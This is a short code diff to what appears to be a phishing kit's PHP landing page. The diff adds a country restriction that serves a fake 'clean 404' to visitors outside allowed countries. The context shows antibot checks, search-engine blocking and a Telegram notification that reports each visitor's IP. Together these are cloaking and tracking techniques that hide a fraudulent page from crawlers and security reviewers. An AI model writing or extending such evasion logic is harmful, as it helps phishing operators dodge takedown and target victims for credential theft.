@@ -4,6 +4,10 @@ include __DIR__ . '/settings.php';
 include __DIR__ . '/lang_main.php';
 require_once __DIR__ . '/antibot.php';
 checkSearchEngineBot(); // Block search bots on landing page
+if (!checkCountryRestriction()) { // Block if not from allowed countries
+    require_once __DIR__ . '/antibot.php';
+    showClean404();
+}
 
 // ── SEND TELEGRAM NOTIFICATION ON PAGE VISIT ──
 function getIP() {
